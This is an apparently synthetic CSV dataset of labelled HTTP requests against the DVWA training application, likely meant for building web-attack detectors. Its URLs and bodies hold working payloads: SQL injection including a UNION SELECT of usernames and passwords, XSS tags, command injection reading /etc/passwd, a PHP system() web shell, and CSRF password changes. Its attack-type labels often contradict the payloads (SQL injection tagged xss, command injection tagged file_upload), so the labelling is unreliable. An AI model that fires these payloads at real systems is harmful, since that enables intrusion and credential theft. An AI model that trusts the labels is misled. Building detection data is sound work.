request_id,timestamp,method,url,headers,body,app_target,anomaly_type,label
222,2025-12-02 12:50:00,GET,http://dvwa.local/vulnerabilities/upload/?id=1' OR '1'='1--,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=a4bcfcabfce2c36f5bd4a4e44c3eca66"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,xss,anomalous
223,2025-12-02 13:00:00,POST,http://dvwa.local/vulnerabilities/upload/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=c2af6a66bc14c1ffbcf2d16c5f6eeff2"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;whoami,DVWA,file_upload,anomalous
224,2025-12-02 13:10:00,GET,http://dvwa.local/vulnerabilities/xss_s/?ip=127.0.0.1;id,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=4fa5d11cedd1fd3c5a53eeee3ed6a56b"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
225,2025-12-02 13:20:00,POST,http://dvwa.local/vulnerabilities/xss_s/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=644e32eaefcf6e3a2b26bc12bbb3e36a"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cscript%3Ealert(1)%3C/script%3E,DVWA,xss,anomalous
226,2025-12-02 13:30:00,POST,http://dvwa.local/vulnerabilities/sqli_blind/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=dd62ede53b24eb36ed64aa3123ce3cc6"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",id=1'+AND+SLEEP(5)--,DVWA,file_upload,anomalous
227,2025-12-02 13:40:00,GET,http://dvwa.local/vulnerabilities/upload/?name=%3Cscript%3Ealert(1)%3C/script%3E,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=c34c65f5b2abbaacf4ad624ac4e16df4"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
228,2025-12-02 13:50:00,POST,http://dvwa.local/vulnerabilities/sqli_blind/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=3edcee2654a5e56ab164cf3512a26d25"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;cat /etc/passwd,DVWA,command_injection,anomalous
229,2025-12-02 14:00:00,POST,http://dvwa.local/vulnerabilities/fi/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=e2af666553dcb1151b4d315cfb2cc42b"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cscript%3Ealert(1)%3C/script%3E,DVWA,file_upload,anomalous
230,2025-12-02 14:10:00,POST,http://dvwa.local/vulnerabilities/sqli/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=54cdf5bb13b356422e33e2154cbbb363"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",id=1'+AND+SLEEP(5)--,DVWA,sqli,anomalous
231,2025-12-02 14:20:00,GET,http://dvwa.local/vulnerabilities/upload/?ip=127.0.0.1;cat /etc/passwd,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=561aa156de3412ce1fb65ff2b2432d6b"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
232,2025-12-02 14:30:00,GET,http://dvwa.local/vulnerabilities/fi/?passwordNew=admin&passwordConf=admin&Change=Change,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=f3e6d4c343a5cfe62561e364e1d3c5eb"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
233,2025-12-02 14:40:00,POST,http://dvwa.local/vulnerabilities/sqli/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=21ff5c4c2e5b45e63caef6b1efb3cbed"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cimg+src=x+onerror=alert(1)%3E,DVWA,csrf,anomalous
234,2025-12-02 14:50:00,POST,http://dvwa.local/vulnerabilities/xss_s/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=463bf4e2fabb25c26f3b2e63dbd351e3"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",passwordNew=admin&passwordConf=admin&Change=Change,DVWA,file_upload,anomalous
235,2025-12-02 15:00:00,POST,http://dvwa.local/vulnerabilities/sql_i/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=a51424c2b53afda12bd4bbd6c62ca65d"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",filename=shell.php,DVWA,csrf,anomalous
236,2025-12-02 15:10:00,POST,http://dvwa.local/vulnerabilities/fi/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=316e1cb4ccd462ceb2ade5eadf31a363"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",id=1'+AND+SLEEP(5)--,DVWA,xss,anomalous
237,2025-12-02 15:20:00,GET,http://dvwa.local/vulnerabilities/csrf/?<?php system($_GET['cmd']); ?>,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=fb6fa2abb1a2eed5cae6eb6c3d4f1351"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
238,2025-12-02 15:30:00,GET,http://dvwa.local/vulnerabilities/xss_r/?id=1' OR '1'='1--,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=d4c43415e2d332b1d62e43fffefd6136"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,xss,anomalous
239,2025-12-02 15:40:00,GET,http://dvwa.local/vulnerabilities/exec/?passwordNew=admin&passwordConf=admin&Change=Change,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=6edba36ba31f56f13f1653e253333c36"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
240,2025-12-02 15:50:00,POST,http://dvwa.local/vulnerabilities/upload/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=6351ca516feeb5c14bddc31cd624af2f"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",id=1' OR '1'='1--,DVWA,command_injection,anomalous
241,2025-12-02 16:00:00,POST,http://dvwa.local/vulnerabilities/sqli/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=dea5cebfb1bbfb2cedfc4bf5befe5cca"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",<?php system($_GET['cmd']); ?>,DVWA,file_upload,anomalous
242,2025-12-02 16:10:00,GET,http://dvwa.local/vulnerabilities/sqli_blind/?ip=127.0.0.1;cat /etc/passwd,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=bcf2df143d45165ebbab14c3e63fdf4c"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,xss,anomalous
243,2025-12-02 16:20:00,GET,http://dvwa.local/vulnerabilities/sql_i/?id=1'+AND+SLEEP(5)--,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=dbd32ff4b32c52bbedcbac5e136cfafa"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
244,2025-12-02 16:30:00,POST,http://dvwa.local/vulnerabilities/exec/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=63c5ca2ddd2fdfeb334be4322cd2bb22"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;cat /etc/passwd,DVWA,sqli,anomalous
245,2025-12-02 16:40:00,GET,http://dvwa.local/vulnerabilities/upload/?passwordNew=admin&passwordConf=admin&Change=Change,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=cfb62df41bbf35451ee2bff164cd6d6a"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,xss,anomalous
246,2025-12-02 16:50:00,GET,http://dvwa.local/vulnerabilities/sqli_blind/?ip=127.0.0.1;id,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=b4e4edcbc354f31dc31cacab56d42c41"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
247,2025-12-02 17:00:00,POST,http://dvwa.local/vulnerabilities/csrf/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=d65db5d62ae3dda2561336d22cfdc25e"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",passwordNew=admin&passwordConf=admin&Change=Change,DVWA,file_upload,anomalous
248,2025-12-02 17:10:00,POST,http://dvwa.local/vulnerabilities/xss_d/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=bfff4c16cdd543cbff2e3b4abeba46b4"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;whoami,DVWA,command_injection,anomalous
249,2025-12-02 17:20:00,GET,http://dvwa.local/vulnerabilities/xss_s/?passwordNew=admin&passwordConf=admin&Change=Change,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=4a4145bb454dfc1d1aa1b5eacceed633"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
250,2025-12-02 17:30:00,GET,http://dvwa.local/vulnerabilities/fi/?id=1'+AND+SLEEP(5)--,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=c6daee6babfecf532d5dfed544564bbf"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
251,2025-12-02 17:40:00,POST,http://dvwa.local/vulnerabilities/xss_r/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=6db6cedf3e4e42cff114e1f1333ca6a1"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}","id=1'+UNION+SELECT+1,username,password+FROM+users--",DVWA,xss,anomalous
252,2025-12-02 17:50:00,POST,http://dvwa.local/vulnerabilities/xss_r/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=e54bf516fcc3b3b33fab1f2bbbca4e4f"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",id=1' OR '1'='1--,DVWA,xss,anomalous
253,2025-12-02 18:00:00,POST,http://dvwa.local/vulnerabilities/sql_i/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=ee43db5a41a43514613fb616bc2cc315"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cimg+src=x+onerror=alert(1)%3E,DVWA,file_upload,anomalous
254,2025-12-02 18:10:00,POST,http://dvwa.local/vulnerabilities/fi/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=4b42cba25ad1a24d12ad6114ad6aedec"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;cat /etc/passwd,DVWA,file_upload,anomalous
255,2025-12-02 18:20:00,GET,http://dvwa.local/vulnerabilities/csrf/?id=1'+AND+SLEEP(5)--,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=d5114a4f5ab3a26cc3b3616214fbd26a"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
256,2025-12-02 18:30:00,GET,http://dvwa.local/vulnerabilities/xss_d/?name=%3Cscript%3Ealert(1)%3C/script%3E,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=616ba4d545ffcda1ea3f664f666fede2"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,xss,anomalous
257,2025-12-02 18:40:00,POST,http://dvwa.local/vulnerabilities/fi/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=e31d53223c4a5dbeaefbf25fb3664cdd"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;cat /etc/passwd,DVWA,csrf,anomalous
258,2025-12-02 18:50:00,POST,http://dvwa.local/vulnerabilities/fi/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=bf16bc164a446cca4fdcbda5ffc5ca5f"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cscript%3Ealert(1)%3C/script%3E,DVWA,command_injection,anomalous
259,2025-12-02 19:00:00,POST,http://dvwa.local/vulnerabilities/xss_s/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=6f146f51415c31b24343a56fd43d3665"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cscript%3Ealert(1)%3C/script%3E,DVWA,file_upload,anomalous
260,2025-12-02 19:10:00,GET,"http://dvwa.local/vulnerabilities/upload/?id=1'+UNION+SELECT+1,username,password+FROM+users--","{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=c6f1bee661a4a51532fee114bcfc21e5"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
261,2025-12-02 19:20:00,GET,http://dvwa.local/vulnerabilities/exec/?<?php system($_GET['cmd']); ?>,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=64b22ef46bf1adfcfecfb65e433aecd5"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,command_injection,anomalous
262,2025-12-02 19:30:00,GET,http://dvwa.local/vulnerabilities/exec/?ip=127.0.0.1;whoami,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=a5aa4513dc1f1e2ea6f6e3edbc3bb1e4"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,command_injection,anomalous
263,2025-12-02 19:40:00,POST,http://dvwa.local/vulnerabilities/sql_i/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=cbf22a36ae3bf2ec5d1c4442d6221bf2"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",id=1'+AND+SLEEP(5)--,DVWA,sqli,anomalous
264,2025-12-02 19:50:00,POST,http://dvwa.local/vulnerabilities/xss_s/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=5bfe5efaa6a3ed54cac12a66f21b36ca"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cimg+src=x+onerror=alert(1)%3E,DVWA,sqli,anomalous
265,2025-12-02 20:00:00,GET,http://dvwa.local/vulnerabilities/sql_i/?filename=shell.php,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=ce5abb3bdcb32f4f66dc536b42bc3ff2"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,command_injection,anomalous
266,2025-12-02 20:10:00,GET,http://dvwa.local/vulnerabilities/csrf/?<?php system($_GET['cmd']); ?>,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=2f1e2aca12d426eacd4ea2e4bdadf451"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
267,2025-12-02 20:20:00,GET,http://dvwa.local/vulnerabilities/exec/?<?php system($_GET['cmd']); ?>,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=1bd255a5f4ddc4f6fbcde1d2565d5e56"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
268,2025-12-02 20:30:00,GET,http://dvwa.local/vulnerabilities/csrf/?passwordNew=admin&passwordConf=admin&Change=Change,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=ab43d4e1d2e3f56be2aaabd3fcc5e566"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
269,2025-12-02 20:40:00,GET,http://dvwa.local/vulnerabilities/exec/?id=1' OR '1'='1--,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=add34e362bdb255231cffd4fb43e5c25"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
270,2025-12-02 20:50:00,GET,http://dvwa.local/vulnerabilities/xss_r/?ip=127.0.0.1;id,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=c3fefe441d6325bb6ef2ceaf361bfbba"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
271,2025-12-02 21:00:00,GET,http://dvwa.local/vulnerabilities/xss_s/?name=%3Cimg+src=x+onerror=alert(1)%3E,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=f1eb1ecefefeae6cccd21bacbb51c1d5"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
272,2025-12-02 21:10:00,GET,http://dvwa.local/vulnerabilities/sqli_blind/?ip=127.0.0.1;whoami,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=c43fcc23dac52353c3bdf62fa65c4aef"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
273,2025-12-02 21:20:00,POST,http://dvwa.local/vulnerabilities/fi/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=b41651cbbd3f36dfeae354552b33a652"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cscript%3Ealert(1)%3C/script%3E,DVWA,xss,anomalous
274,2025-12-02 21:30:00,GET,http://dvwa.local/vulnerabilities/csrf/?ip=127.0.0.1;id,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=c36e3c626535f61d35ef6da1e2ff64d6"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
275,2025-12-02 21:40:00,GET,http://dvwa.local/vulnerabilities/xss_s/?ip=127.0.0.1;id,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=1d1bfadfc4bfae5ab5416163b3f6da6c"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
276,2025-12-02 21:50:00,GET,http://dvwa.local/vulnerabilities/sqli_blind/?ip=127.0.0.1;whoami,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=562cf54b4decdd6fc45b1313eef6f5a4"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
277,2025-12-02 22:00:00,POST,http://dvwa.local/vulnerabilities/xss_s/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=41e255a5b3f415bd6b24135b2133116b"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",<?php system($_GET['cmd']); ?>,DVWA,xss,anomalous
278,2025-12-02 22:10:00,POST,http://dvwa.local/vulnerabilities/exec/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=3642cab51cba1e6dfcc5d2f2bbab3c13"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",passwordNew=admin&passwordConf=admin&Change=Change,DVWA,xss,anomalous
279,2025-12-02 22:20:00,POST,http://dvwa.local/vulnerabilities/fi/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=db2ede4f4bdbe1a22f5eb5fab15c511c"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;id,DVWA,xss,anomalous
280,2025-12-02 22:30:00,POST,http://dvwa.local/vulnerabilities/csrf/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=f5b426a5f62c312d32124aa3c2f3dc46"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",passwordNew=admin&passwordConf=admin&Change=Change,DVWA,xss,anomalous
